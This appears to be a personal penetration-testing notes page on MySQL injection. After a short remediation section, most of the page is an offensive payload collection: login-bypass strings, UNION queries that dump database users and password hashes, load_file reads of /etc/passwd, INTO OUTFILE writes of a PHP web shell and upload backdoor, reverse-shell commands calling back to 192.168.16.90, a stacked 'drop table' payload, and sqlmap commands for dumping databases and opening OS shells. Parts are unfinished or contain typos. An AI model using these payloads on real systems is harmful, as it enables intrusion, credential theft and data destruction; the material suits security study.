# MySQL Injection

SQL Injection (SQLi) happens when `unsanitized` user input `breaks out` of the `original query` made by the developer and finally passed on to a database to perform malicious actions.



{% @github-files/github-code-block %}



## Impact / Risk

1. Manupulate the database / data modification and leak
2. Gain access to the underlying os and RCE
3. DoS attacks on DB servers
4. Spreading Malware / phishing

## Remediation

1. Application layer
   1. Whitelist input validation
   2. Use of parameterized query, Java context: callable statement for stored procedure
      1. run time binding
   3. Try to use ORM libs like hibernate
   4. Don't disclose verbose `sql error` to end users
   5. All database related transactions should have audit log.
2. Database layer
   1. Instead of quering from table, query from `view` to restrict the access and blast radius.
   2. Follow least privilege principle for all db objects like `db_user`, stored procudure, views / tables.
   3. enforce row / column level access control
   4. DB and OS hardening, regular security patch update
   5. Enable database encryption
   6. Maintain and monitor audit log for database operations
3. Network layer
   1. Deploy WAF and periodic update SQLi rules

> **How does parameterized queries prevents the SQL Injection?**
>
> By using runtime binding, developers can ensure that user input is treated as data and not as executable code.
>
> 1. In languages that support parameterized queries, developers can use placeholders for parameters in SQL statements instead of concatenating user input directly into the query string. The actual values for these placeholders are then provided separately, typically as parameters, during the execution of the query
> 2. When using parameterized queries, the underlying database driver or API automatically handles the escaping of user input. This means that special characters entered by users are treated as data and not as part of the SQL syntax. This prevents these characters from being interpreted as SQL commands.
> 3. With parameterized queries, the database driver knows the expected data types of the parameters. This type safety helps prevent certain types of injection attacks where an attacker might attempt to inject malicious data of a different type than expected by the query.

## Language Type

| Type | Example                        | Usage    |
| ---- | ------------------------------ | -------- |
| DML  | INSERT, DELETE, UPDATE, SELECT | frequent |
| DDL  | CREATE, DROP, ALTER, TRUNCATE  | rare     |

## MySQL Comment

| Style      | Comment                                                                             |
| ---------- | ----------------------------------------------------------------------------------- |
| Hash style | SELECT \* FROM tbl\_emp WHERE username = '' OR 1=1;#' AND password = 'anything';    |
| SQL style  | SELECT \* FROM tbl\_emp WHERE username = '' OR 1=1;-- -' AND password = 'anything'; |

```
            | SELECT * FROM tbl_emp WHERE username = '' OR 1=1;--+-' AND password = 'anything';
```

NULL byte style | SELECT \* FROM tbl\_emp WHERE username = '' OR 1=1;%00' AND password = 'anything' C style | `SELECT * FROM tbl_emp WHERE username = '' OR 1=1;/*' AND password = '*/'';`

## Identify the entry point

* Find a page where user can interact with underlying database via his input.
* For example, searching / lockup a record using job\_id, user registration, profile update, deleting an entry
  * Guess the structure of underlying database query (`SELECT` / `INSERT` / `UPDATE` / `DELETE`)
* While testing, `URL encode` special characters (i.e specially `blank space`) for GET and POST.
* `Semicolon` - is used to end the query although it is `optional` in the payload.
* Sometimes client side `JavaScript` removes the single quote while supplying through browser. So best practice to deliver the payload through burp.

## Bypass Authentication

The attacker can choose any field - `username` or `password` or `both` in order to alter the `intention` of the SQL query made by developer.

* Usually `password` field is not vulnerable as it is not used by the underlying query.
* `username` field is used by the query through `WHERE` statement in order to fetch the `hash`.
* Application converts the user supplied `password` into the `hash` and then compare these two `hashes`.

> - LIMIT {n}, {m}
>   * n = 0 means select `first` row
>   * m = 4 means fetch maximum `four` rows
> - Explicitly specifying through `LIMIT` and `OFFSET` keyword: LIMIT {m} OFFSET {n}

```
[+] general query:
SELECT * FROM tbl_emp WHERE username = '' AND password = '';

[+] login as the first user of the database table. mostly 'admin' user is present in the first row.
payload (username) = ' OR 1=1 LIMIT 0,1;#

[+] login as the third user of the database table
payload (username) = anything' OR 1=1 LIMIT 2,1;#

[+] login as 'offsec' user
payload (username) = offsec' OR 1=1 LIMIT 0,1;#
```

```
[+] scenario 1: bypass the length restriction
=============================================
- developer imposes a length restriction on the username field so that the above payload won't work.
- password field is used by the underlying query
- try to login as offsec user
- the primary objective is to craft the payload in such a way so that the entire expression of the WHERE condition should evaluate as TRUE.

payload (username) = offsec'*/
payload (password) = /* or 1=1;#

[+] query:
select * from users where username='offsec'*/' and password='/* or 1=1;#' limit 0,1;

[+] expression evaluation:
select * from users where username='offsec' or 1=1;#' limit 0,1; => after stripping out the commented section
TRUE or TRUE
TRUE
```

```
[+] scenario 2: bypass the comment character filtering
======================================================
- developer imposes a validation on the username field where it filters out all SQL comment characters.
- password field is used by the underlying query
- try to login as offsec user

payload (username) = offsec' or 1=1 or '1'='1
payload (password) = anything

[+] query:
select * from users where username='offsec' or 1=1 or '1'=1' and password='anything' limit 0,1;
[+] expression evaluation:
TRUE or TRUE or (TRUE and FALSE) => AND operator has precedence over OR operator
(TRUE or TRUE) or FALSE
(TRUE or FALSE)
TRUE

[+] login as the first user of the database users table
--------------------------------------------------------
payload (username) = anything' or 1=1 or '1'='1
payload (password) = anything

[+] query:
select * from users where username='offsec' or 1=1 or '1'=1' and password='anything' limit 0,1;
[+] expression evaluation:
FALSE or TRUE or (TRUE and FALSE)
(FALSE or TRUE) or FALSE
(TRUE or FALSE)
TRUE
```

```
[+] scenario 3: bypass all special characters filtering
======================================================
- developer imposes a validation on the username field where it filters out all special characters such as single quote, double quote, equal and comment.
- password field is used by the underlying query
- try to login as offsec user

payload (username) = offsec
payload (password) = anything' or '1'='1

[+] query:
select * from users where username='offsec' and password='anything' or '1'='1' limit 0,1;
[+] expression evaluation:
(TURE and FALSE) or TRUE
FALSE or TRUE
TRUE


[+] login as the first user of the database users table
--------------------------------------------------------
payload (username) = anything => not delivering any SQLi payload in the username field
payload (password) = anything' or '1'='1

[+] query:
select * from users where username='offsec' and password='anything' or '1'='1' limit 0,1;
[+] expression evaluation:
(FALSE and FALSE) or TRUE
FALSE or TRUE
TRUE
```

## `WHERE`, `GROUP BY`, `HAVING` clause in `SELECT`

### Normal Detection

> * **`In-band`** detection: In this case, same channel is used to inject the sql code and result of exploitation is directly included in response from the web application.
> * **`Error-based`**: application throws
>   * `500` status code with Internal Server Error
>   * Verbose SQL error with underlying database query

```
[data type = VARCHAR]
=====================
job_code = admin => valid input
job_code = admin' => SQL error / reveals the info on the underlying database
job_code = admin'' 	=> SQL error disappears, confirms the possibility of STRING based SQLi

[=] confirm the vulerability by generating the same or valid string
- update here, hacker's handbook, waptx slide


[data type = NUMBER]
====================
job_id = 2	=> valid input
job_id = 2'	=> SQL error, reveals the info on the underlying database
job_id = 2'' => same SQL error

[=] confirm the vulerability by generating the same or valid number
job_id = 5-3	=> through arithmetic operations
job_id = 1+1	=> urlencode() `+` for GET method
job_id = celi(pi())		=> through build-in function
job_id = floor(version())

[+] Other native functions to generate integer
- CHAR_LENGTH(@@version)
- ASCII(@@version)
- ASCII(SUBSTRING(@@version,2,1)) 
```

### Blind Detection

In this scenario, server does not display any error message because error message is handled gracefully.

#### Boolean Condition Injection

```
[data type = VARCHAR]
=====================
Job_title = admin => normal input
Job_title = admin' and 1=1;# => same result, TRUE
Job_title = admin' and 1=2;# => no result, FALSE
Job_title = admin' or 1=1;# => displays all values, SHORT CIRCUIT

[data type = NUMBER]
====================
job_id= 2 => normal input
job_id= 2 and 1=1;# => same result, TRUE
job_id= 2 and 1=2;# => No result, FALSE
job_id= 2 or 1=1;# => displays all values, SHORT CIRCUIT
```

#### Time based

TBD

### How many columns are returned by the underlying original query

```
payload = admin' order by 1;# => returns record
payload = admin' order by 2;# => returns record
payload = admin' order by 3;# => returns no record

[+] alternate method:
payload = admin' union null;# => returns record
payload = admin' union null, null;# => returns record
payload = admin' union null, null, null;# => returns no record

[+] we infer that 2 columns are returned by the underlying query
```

### Balance two queries with `UNION` and find which column is displayed

```
payload = admin' union select null, null;# => no error and displays additional line/record with black data
payload = admin' union select 'w01t', 'w02t';# => no error and displays additional line / record/ row

[+] Note:
- Sometime, not all columns are displayed by the application, so we need to find which column is displayed.
- if found 'w02t' in HTML, This indicates, although 2 columns are returned but application displays only 2nd column.
- we need only one column to extract all data.
```

### Data Exfiltration

Consider the second column is `displayed` at user end.

```
extract the database version:
=============================
payload = admin' union select null, version();#


find the database username:
===========================
payload = admin' union select null, user();#

Enumerate the location of the database file:
============================================
payload = admin' union select null, @@datadir;#

Enumerate the system user:
===========================
payload = admin' union select null, system_user();#

Enumerate the hostname:
======================
payload = admin' union select null, @@hostname;#

Enumerate list of mysql users:
=============================
payload = admin' union select null, user from mysql.user;#

Enumerate database name:
========================
payload = admin' union select null, database();#
```

### Verify user privileges

Check if the present database user can read and write a file,

```
payload = admin' union select null, concat(grantee,':----:', privilege_type,':----:', is_grantable) from information_schema.user_privileges;#
```

### Find all tables and columns from metadata

Use string `concatenation` to accommodate more data into single column.

```
payload = admin' union select null, concat(table_name,':----:',column_name) from information_schema.columns;#

// need limit to iterate 0 -> max ?
```

### Extracting password hash from mysql.user table

```
payload = admin' union select null, concat(user,':----:',password) from mysql.user;#
```

#### Crack hash with Cain

```
- there is no salt for mysql hash and it is based on SHA1
- Omit the * => that indicates the start of the hash
- MySQL hash -> Add to list -> provide hash and username -> crack Mysql sha1 hashes ->
- add more than one dictionary file to increase the cracking chances
```

### Arbitrary File Read

```
payload = admin' union select null, load_file('/etc/passwd');#

[+] hex encode the values when `/` or some keywords in the filename are filtered
[online] => http://www.asciitohex.com/
[python] => file = '0x' + ''.join("{:x}".format(ord(c)) for c in '/etc/passwd') => 0x2f6574632f706173737764

payload = admin' union select  null, load_file(0x2f6574632f706173737764);#
```

#### Steal entire database & restore locally

```
MySQL stores data in files.
Each database has its own subfolder and each table has three files associated with it
- table.MYI
- table.MYD
- table.frm

for example, default table mysql.user would be stored in three files - user.MYI, user.MYD and user.frm.

[+] how to find the location of mysql root folder
payload = admin' union select null, @@datadir;# =>  /var/lib/mysql/
so the probable location of those files => /var/lib/mysql/<database_name>/

[+] how to read those files:
- directory traversal with null byte injection
[TBD] => SQLi load_file() doen't working, probably file contains null bytes.

[+] restore the database in local kali box
Create a directory (i.e steal) inside /var/lib/mysql/ and copy the 3 files into that folder.
run mysql service:/usr/bin/mysqld_safe &
- show databases;
- use steal;
- show tables;
```

### Arbitrary File Write

> **Key Point**
>
> If `<?php any-php-code ?>` is found in a file called by the web server, `PHP` code will be executed.

Before writing the `cmd_web_shell_base64.php` into the filesystem, we need to know under which location application stores all `php` files.

For Example - `nikto` scan reveals that application’s php files are stored under `/var/www/manual/` directory.

```
payload = admin' union select null, '<?php echo shell_exec(base64_decode($_GET["cmd"]));?>' into outfile '/var/www/manual/cmd_web_shell_base64.php';#

[+] verify that file created successfully
payload = admin' union select null, load_file('/var/www/manual/web_shell_base64.php');#

[+] hex encode the values when `/` or some keywords in the filename are filtered
[online] => http://www.asciitohex.com/
file = '0x' + ''.join("{:x}".format(ord(c)) for c in '<?php echo shell_exec(base64_decode($_GET["cmd"]));?>')
file => 0x3c3f706870206563686f207368656c6c5f65786563286261736536345f6465636f646528245f4745545b22636d64225d29293b3f3e
```

**\[+] Alternate approach: Push `cmd_webshell` code into the database**

If you are able to update / insert any entry then push the `php` code into the database table.

It means, now `mysql\database_name\table_name.MYD` has the code.

Try to access the file through `directory traversal`.

### Remote Command Execution

Supply `commands` in `base64` encoded form through "`cmd`" parameter.

```
echo 'ls -al' | base64  => bHMgLWFsCg==
http://192.168.2.11/manual/web_shell_base64.php?cmd=bHMgLWFsCg==

[+] RCE and receive reverse shell on 192.168.16.90:443
echo 'bash -i >& /dev/tcp/192.168.16.90/443 0>&1' | base64  => YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2LjkwLzQ0MyAwPiYxCg==
```

### Obtain Remote shell

For **linux platform**, we can directly write `reverse_shell.php`.

We can use port 80 or 443 to anticipate the reverse connection.

```
payload = admin' union select null, <?php echo shell_exec('bash -i >& /dev/tcp/192.168.16.90/443 0>&1');?> into outfile '/var/www/manual/reverse_shell.php';#

[+] check if that file created successfully
payload = admin' union select null, load_file('/var/www/manual/reverse_shell.php');#

[+] get the reverse shell on kali 443 port
- start nc listening on port 443
- access http://192.168.17.252:8000/manual/reverse_shell.php through browser and receive the low privileged shell.
```

For **windows platform**, leverage `cmd_webshell` and download netcat or windows reverse shell via `TFTP` or inline FTP\` from Kali box and execute.

### File Upload Backdoor

Write `backdoor.php` to upload any files through `cmd_web_shell_base64.php`.

Convert the following command in `base64` encoded form

```
echo "<?php copy($HTTP_POST_FILES['file']['tmp_name'],$HTTP_POST_FILES['file']['name']); ?>" > x.php

[+] output
ZWNobyAiPD9waHAgY29weSgkSFRUUF9QT1NUX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sJEhUVFBf UE9TVF9GSUxFU1snZmlsZSddWyduYW1lJ10pOyAgICAgICAgPz4iID4geC5waHAg

[+] TBD
write code for python backdoor
```

Supply this output through "`cmd`" parameter to create the `x.php` inside the same directory.

**Stub File**: Create a HTML file inside local Kali to interact with that `php` script.

```html
<html>
<head></head>
<body>
<!-- change the ip address of the remote host -->
<form action="http://192.168.240.131/x.php" method="post" enctype="multipart/form-data">
<br><br>
Choose a file to upload:<br>
<input type="file" name="file"><br>
<input type="submit" name="submit" value="submit"> </form>
</body>
</html>
```

Access `x.php` file to upload any `reverse_shell.exe` and execute through `cmd_web_shell_base64.php` to obtain the reverse shell.

## Exploiting `ORDER BY` clause

`ORDER BY` clause is basically used to sort the data. In this scenario, user input goes after `ORDER BY` clause .

**Backend Query:**

* mysql> select id from news where id =1 order by `1` `desc`

So input could be a

* column name => VARCHAR
* column number => NUMBER
* some time user input can only control => `desc`

### Detection

We need to apply `blind-boolean-condition` injection technique.

```
query = SELECT column1, column2 FROM table_name ORDER BY column1, column2 DESC;

if user can control only DESC / ASE parameter ?
if user can control column2
[+] TRUE condition
payload = 1, (select case when (1=1) then 1 else 1*(select table_name from information_schema.tables)end)=1;#
Result => No Error. Display the same result.

[+] FALSE condition
payload  = 1, (select case when (1=2) then 1 else 1*(select table_name from information_schema.tables)end)=1;#
Result => ERROR 1242 (21000): Subquery returns more than 1 row

[+] check if sqlmap works to extract data

if user can control column1 then craft payload to comment out column2 and DESC

using delay
input : id',(select sleep(10) from dual where database() like database())#
```

## Filter Bypass and Payload Obsfuscation

if `space` is filtered then use `/**/` or `brackets` or `tabs`.

```
job_code = 'union/**/select/**/password/**/FROM/**/accounts/**/WHERE/**/username/**/=/**/'admin'#
```

### Exploiting INSERT Query

The `output` of the `INSERT` query is not `directly` relevant to us because it only returns the number of `affected` rows.

```sql
Query OK, 1 row affected (0.01 sec)
```

However, the exploitation is yet possible and we can extract the entire database information.

> It is possible to INSERT multiple rows/ entries in a single `INSERT` query.

## Injection Point

Usually, `INSERT` query is used in the following pages

1. Registration page
2. Comment / feedback page
3. Add new entry page etc.

There are some situations, where a user controls only `one` column through UI however underlying `INSERT` query uses more columns.

Before exploiting the INSERT query, we need to guess the followings

1. Number of columns used by the underlying INSERT query.
2. data types used by those columns
3. Table name.

> In a INSERT query, specifying column names are optional.
>
> query = `INSERT INTO tbl_post02(comment, pin, age, user) VALUES('hello', 100, 22, 'anonymous');`
>
> query without column name = `INSERT INTO tbl_post02() VALUES('hello', 100, 22, 'anonymous');`

## Scenario: The user tries to INSERT an entry into a table but the UI does not show any column of that table

> We can't extract data from a table where we tries to insert an entry.
>
> However we can extract data from other table via `blind time based injection`.

* Because via `IF` statement we can control the return value.
* The primary logic:
  * If MySQL executes sleep() command, insert `x` into the table
  * Else insert `y`.
* This technique works for extracting the value from a column that has either be `VARCHAR` or `INT` data type.

### Sub scenario 1: The user can control the first column of the table and column datatype = VARCHAR

```
# target of extraction: `age` => INT column of the tbl_post02()
# table used in the query: tbl_post02()
# structure: `comment` => VARCHAR, pin => INT, `age` => INT, user => VARCHAR

query = INSERT INTO tbl_post02() VALUES('hello', 100, 22, 'anonymous')
payload = blah', (IF((SELECT age from tbl_post02 WHERE user = 'admin') = 25, sleep(10), 2)), 22, 'anonymous')#

poisoned query =  INSERT INTO tbl_post02() VALUES('blah', (IF((SELECT age from tbl_post02 WHERE user = 'admin') = 25, sleep(10), 2)), 22, 'anonymous')#', 100, 22, 'anonymous')

# result
Error: 1093 (HY000): Table 'tbl_post02' is specified twice, both as a target for 'INSERT' and as a separate source for data
```

> We can't execute sub query on the same table and extract the data.

Hence, let's extract data from another table.

```
# target of extraction: token => INT column of tbl_secret()
# table used in the query: tbl_post02()
# structure: `comment` => VARCHAR, pin => INT, `age` => INT, user => VARCHAR
# attacker controls the comment column

query = INSERT INTO tbl_post02() VALUES('hello', 100, 22, 'anonymous');
payload = blah', (IF((SELECT token from tbl_secret WHERE user = 'admin') = 777, sleep(10), 2)), 0, 'anonymous')#

poisoned query =  INSERT INTO tbl_post02() VALUES('blah', (IF((SELECT token from tbl_secret WHERE user = 'admin') = 777, sleep(10), 99)), 66, 'anonymous')#', 100, 22, 'anonymous');

# result
- if the token(i.e 777) matches then app sleeps (pauses) for the number of seconds given by the duration argument=10 then returns 0. this 0 gets inserted into the second column (pin) of tbl_post02().
- If SLEEP() is interrupted, it returns 1 and this 1 gets inserted.
- if the token(i.e 777) does matches then 2 gets inserted.
```

If second column is `VARCHAR` instead of `INT` then it generates error. To mitigate that use `CONVERT()` function.

```
query = INSERT INTO tbl_post03 (comment, city, age, user) VALUES ('hola', 'mountain view', 25, 'admin');
payload = blah', (SELECT CONVERT((IF((SELECT token from tbl_secret WHERE user = 'admin') = 777, sleep(10), 2)), CHAR)), 0, 'anonymous')#

poisoned query = INSERT INTO tbl_post03 (comment, city, age, user) VALUES ('blah', (SELECT CONVERT((IF((SELECT token from tbl_secret WHERE user = 'admin') = 777, sleep(10), 2)), CHAR)), 0, 'anonymous')#', 'mountain view', 25, 'admin');
```

#### Case 2: user controls the last or any other VARCHAR column other than the first column

* We can't directly put the payload into the last column because of the leading single quote character that ends the query.
* If we control the second column then we can place the payload either third or last column.
* If we control the last column i.e 'user' then we can to add two entries in one INSERT query and then place the payload either the first column / any column of the 2nd entry.

```
# target of extraction: token => INT column of tbl_secret()
# table used in the query: tbl_post02()
# structure: `comment` => VARCHAR, pin => INT, `age` => INT, user => VARCHAR
# attacker controls the user column

query = INSERT INTO tbl_post02() VALUES('hello', 100, 22, 'patrik');
payload = blah_user'),('blah', (IF((SELECT token from tbl_secret WHERE user = 'admin') = 777, sleep(10), 2)), 0, 'anonymous')#

poisoned query = INSERT INTO tbl_post02() VALUES('hello', 100, 22, 'blah_user'),('blah', (IF((SELECT token from tbl_secret WHERE user= 'admin') = 777, sleep(10), 2)), 0, 'anonymous')#');
```

#### Case 3: user controls any INT column

```
# target of extraction: token => INT column of tbl_secret()
# table used in the query: tbl_post02()
# structure: `comment` => VARCHAR, pin => INT, `age` => INT, user => VARCHAR
# attacker controls the pin column

query = INSERT INTO tbl_post02() VALUES('hello', 100, 22, 'anonymous');
payload = (IF((SELECT token from tbl_secret WHERE user = 'admin') = 777, sleep(10), 2)), 0, 'anonymous')#

poisoned query =  INSERT INTO tbl_post02() VALUES('blah', (IF((SELECT token from tbl_secret WHERE user = 'admin') = 777, sleep(10), 99)), 66, 'anonymous')#', 100, 22, 'anonymous');
```

### Scenario: App displays columns of the table where the user tries to INSERT an entry

#### Case 0: App displays only one INT column

* Similar `Case 3: user controls any INT column`: we need to use same blind injection techniques.

#### Case 1: App displays only one VARCHAR column that user controls

* The same way, we need to add two entries in one INSERT query and put the payload on the displayed column.

```
# http://localhost:5000/case02
# target of extraction: token => INT column of tbl_secret()
# table used in the query: tbl_post02()
# structure: `comment` => VARCHAR, pin => INT, `age` => INT, user => VARCHAR
# attacker controls the comment column
# only comment column is displayed in the UI

query = INSERT INTO tbl_post02() VALUES('hello', 100, 22, 'anonymous');
payload = blah_comment', 0, 0, 'anonymous'),((SELECT password from tbl_secret WHERE user = 'admin'), 0, 0, 'anonymous')#

poisoned query = INSERT INTO tbl_post02() VALUES('blah_comment', 0, 0, 'anonymous'),((SELECT password from tbl_secret WHERE user = 'abhi'), 0, 0, 'anonymous')#', 100, 22, 'anonymous');
```

#### Case 2: App displays only one VARCHAR column that comes before the column that the user controls

The same way, we need to add two entries in one INSERT query and put the payload on the displayed column.

```
# target of extraction: token => INT, password => VARCHAR of tbl_secret()
# table used in the query: tbl_post02()
# structure: `comment` => VARCHAR, pin => INT, `age` => INT, user => VARCHAR
# attacker controls the user column
# only comment column is displayed in the UI

query = INSERT INTO tbl_post02() VALUES('hello', 100, 22, 'anonymous');
payload = blah_user'),((SELECT password from tbl_secret WHERE user = 'abhi'), 0, 0, 'anonymous')#

poisoned query = INSERT INTO tbl_post02() VALUES('blah_user'),((SELECT password from tbl_secret WHERE user = 'abhi'), 0, 0, 'anonymous')#', 100, 22, 'anonymous');
```

#### Case 3: App displays only one VARCHAR column that comes after the column that the user controls

We can `directly` exfiltrate the data through `sub query injection` technique on that `displayed` column.

```
# target of extraction: token => INT column of tbl_secret()
# table used in the query: tbl_post02()
# structure: `comment` => VARCHAR, pin => INT, `age` => INT, user => VARCHAR
# attacker controls the comment column
# only user column is displayed in the UI

query = INSERT INTO tbl_post02() VALUES('hello', 100, 22, 'anonymous');

[+] enumerate database name
============================
payload = blah', 0, 0, (SELECT database()))# => vulnapp

[+] extract all tables belongs to that database by iterating the OFFSET field
==============================
payload = blah', 0, 0, (SELECT table_name FROM information_schema.tables where table_schema='vulnapp' LIMIT 0,1))# => tbl_post02
payload = blah', 0, 0, (SELECT table_name FROM information_schema.tables where table_schema='vulnapp' LIMIT 1,1))# => tbl_post01
payload = blah', 0, 0, (SELECT table_name FROM information_schema.tables where table_schema='vulnapp' LIMIT 2,1))# => tbl_secret
payload = blah', 0, 0, (SELECT table_name FROM information_schema.tables where table_schema='vulnapp' LIMIT 3,1))# => tbl_post03
payload = blah', 0, 0, (SELECT table_name FROM information_schema.tables where table_schema='vulnapp' LIMIT 4,1))# => error / none (implies row does not exist)

[+] extract all columns belongs to a particular table (for example - tbl_secret)
===============================
payload = blah', 0, 0, (SELECT column_name FROM information_schema.columns where table_schema='vulnapp' AND table_name = 'tbl_secret' LIMIT 0,1))# => user
payload = blah', 0, 0, (SELECT column_name FROM information_schema.columns where table_schema='vulnapp' AND table_name = 'tbl_secret' LIMIT 1,1))# => token
payload = blah', 0, 0, (SELECT column_name FROM information_schema.columns where table_schema='vulnapp' AND table_name = 'tbl_secret' LIMIT 2,1))# => password
payload = blah', 0, 0, (SELECT column_name FROM information_schema.columns where table_schema='vulnapp' AND table_name = 'tbl_secret' LIMIT 3,1))# => error / none

[+] extract all entries of tbl_secret
=====================================
payload = blah', 0, 0, (SELECT CONCAT(user, '=', CONVERT(token, CHAR), '=', password) FROM tbl_secret LIMIT 0,1))# => admin=777=abc
payload = blah', 0, 0, (SELECT CONCAT(user, '=', CONVERT(token, CHAR), '=', password) FROM tbl_secret LIMIT 1,1))# => ravi=101=xyz
payload = blah', 0, 0, (SELECT CONCAT(user, '=', CONVERT(token, CHAR), '=', password) FROM tbl_secret LIMIT 0,1))# => error / none

# stack query:
==============
it means when two or more queries are queued to be executed by a database one after another in the same session. It is also depends on the programming language.
[+] allowed => MySQL: asp, PostgreSQL: asp, php, python, MS SQL: asp

[+] drop a table(i.e tbl_post03) if stacked query is allowed by the underlying language
=======================================================================================
payload = blah', 0, 0, (SELECT version())); drop table tbl_post03;#
```

> `SELECT` statement cannot have an `INSERT` or `UPDATE` statement as a sub-select query, so in this case it must be done through stacked SQL queries. On the other hand, if there is a SQL injection in `INSERT` or `UPDATE`, an attacker would need to take advantage of stacked queries to fetch data.

### Duplicate key-based insertion to update a value on the same table

When a primary key is set for a column then we can update any columns on the same table.

```
# http://localhost:5000/case03
# update `age` => INT column of the tbl_post03()
# table used in the query: tbl_post03()
# structure: `comment` => VARCHAR, city => VARCHAR, `age` => INT, user => VARCHAR, primary key(user)
# attacker controls the comment column

query = INSERT INTO tbl_post02() VALUES('hello', 100, 22, 'anonymous')
payload = hola', 'mountain view', 25, 'admin') ON DUPLICATE KEY UPDATE age = 29#

poisoned query = INSERT INTO tbl_post02() VALUES('hola', 'mountain view', 25, 'admin') ON DUPLICATE KEY UPDATE age = 29#', 100, 22, 'anonymous')

# update `comment` => VARCHAR column of the tbl_post03()
# table used in the query: tbl_post03()
# structure: `comment` => VARCHAR, city => VARCHAR, `age` => INT, user => VARCHAR, primary key(user)
# attacker controls the age column

query = INSERT INTO tbl_post03() VALUES('hello', 100, 22, 'anonymous')
payload = 30, 'admin') ON DUPLICATE KEY UPDATE comment = 'Hola!'#

poisoned query = INSERT INTO tbl_post03() VALUES('hello', 100, 30, 'admin') ON DUPLICATE KEY UPDATE comment = 'Hola!'#, 'anonymous')

```

**Authentication bypass if registration page is vulnerable for SQLi**

Lets assume, follwoing query is used in the registration page and primay key (email).

```
query = INSERT INTO users (email, password) VALUES ('your_email_input', 'bcrypt_hash_of_your_password_input);

If we know any user's email then we can change his password.

payload = attacker_dummy@example.com', 'bcrypt_hash_of_qwerty'), ('admin@example.com', 'bcrypt_hash_of_qwerty') ON DUPLICATE KEY UPDATE password='bcrypt_hash_of_qwerty')#

poisoned query = INSERT INTO users (email, password) VALUES ('attacker_dummy@example.com', 'bcrypt_hash_of_qwerty'), ('admin@example.com', 'bcrypt_hash_of_qwerty') ON DUPLICATE KEY UPDATE password='bcrypt_hash_of_qwerty')#', 'bcrypt_hash_of_your_password_input');

# is there any problem if we try to trigger the duplicate key update on the first entry instead of second?

poisoned query = INSERT INTO users (email, password) VALUES ('admin@example.com', 'bcrypt_hash_of_qwerty') ON DUPLICATE KEY UPDATE password='bcrypt_hash_of_qwerty')#', 'bcrypt_hash_of_your_password_input);

it might possible app checks for the existing user before executing the INSERT query. due to this, the above payload may not get a change to execute and blocked by the previous SELECT query.
```

## SQLMap Cheatsheet

```
[+] fine tune the configuration
===============================
verbose SQL payload send: -v 3
request send through proxy: --proxy "http://127.0.0.1:8080"
supply entire request body through a file: -r burp-captured-request.txt
data send through GET request: --url "http://www.target.com/vuln.php?id=100"
data sent through POST request: --url "http://www.target.com/vuln.php" --data "id=100,state=CA"
exclude parametes: --skip=user-agent,referer
specific testable parameter: -p "id", "user-agent"

[+] speed up the process
========================
providing the database name if already known: --dbms=mysql
avoid time based technique and only use union based technique:
	--technique=U
	--union-cols=7-10 => setting the nos of column

Inject payload prefix string: --prefix=PREFIX, Example: --prefix="'" => single quote to speed up the process
Inject payload suffix string: --suffix=SUFFIX, Example: --suffix= " # "


[+] exploitation
================
Database fingerprint and banner grabbing: --banner, use -f to perform extensive DBMS version fingerprint
Extract current database: --current-db
Extract tables from current database: --dump -D <database_name> --tables <table_names>
Checking DB admin role: --is-dba
DB Enumeration: --users --passwords --privileges -- roles --dbs--tables --schema

Dump all DBMS table entries: --dump-all, Alternate - Use -a to retrive all, Output saved in /root/.sqlmap/output
Bypassing banned characters ( > character, spaces and capital SELECT string): --tamper=between,randomcase,space2comment

Read a file from DB file system: --file-read 'C:/example.exe'
Write a file to the DB file system: --file-write '/software/nc.exe.packed' --file-dest 'C:/WINDOWS/Temp/nc.exe'
SQL statement to be executed: --sql-query=QUERY
Execute SQL statements from a given file: --sql-file=SQLFILE

Prompt for an interactive shell: --sql-shell
Prompt for a interactive OS shell: --os-shell
Execute OS command: --os-cmd=OSCMD
```

### Exploit through SQLMap

```
# extract the db, testable parameter = comment
sqlmap --url http://localhost:5000/case02 --data "comment=hello" -p "comment" --current-db

# extract db tables
sqlmap --url http://localhost:5000/case02 --data "comment=hello" -p "comment" --dbms=mysql -D vulnapp --tables

# extract columns from tbl_secret
sqlmap --url http://localhost:5000/case02 --data "comment=hello" -p "comment" --dbms=mysql -D vulnapp -T tbl_secret --columns

# extract the values from password columns of tbl_secret
sqlmap --url http://localhost:5000/case02 --data "comment=hello" -p "comment" --dbms=mysql -D vulnapp -T tbl_secret -C password --dump

# dump the entire tbl_secret
sqlmap --url http://localhost:5000/case02 --data "comment=hello" -p "comment" --dbms=mysql -D vulnapp -T tbl_secret --dump

# dump the entire vulnapp db
sqlmap --url http://localhost:5000/case02 --data "comment=hello" -p "comment" --dbms=mysql -D vulnapp --dump-all

[15:01:29] [INFO] table 'vulnapp.tbl_post01' dumped to CSV file '/root/.sqlmap/output/localhost/dump/vulnapp/tbl_post01.csv'
[15:01:29] [INFO] fetched data logged to text files under '/root/.sqlmap/output/localhost'

# prompt for an interactive SQL shell
sqlmap --url http://localhost:5000/case02 --data "comment=hello" -p "comment" --dbms=mysql -D vulnapp --sql-shell
```
